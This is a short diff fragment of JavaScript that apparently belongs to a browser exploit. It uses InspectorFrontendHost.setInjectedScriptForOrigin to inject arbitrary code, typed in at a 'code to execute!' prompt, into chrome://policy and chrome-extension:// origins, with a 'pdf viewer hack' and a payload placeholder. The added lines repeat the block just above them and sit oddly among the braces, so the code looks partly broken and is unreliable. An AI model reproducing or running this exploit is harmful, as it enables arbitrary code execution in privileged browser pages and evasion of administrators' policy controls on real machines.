@@ -231,6 +231,12 @@
                     InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                     
                 }
+                    path = "index.html"; // pdf viewer hack
+                    is_pdf = true;
+                    const b = prompt("code to execute!");
+                    if (!b) return;
+                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
+                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                 const URL_1 = `chrome-extension://${x ??
                     alert("NOTREACHED")}/${path}`;
                 InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
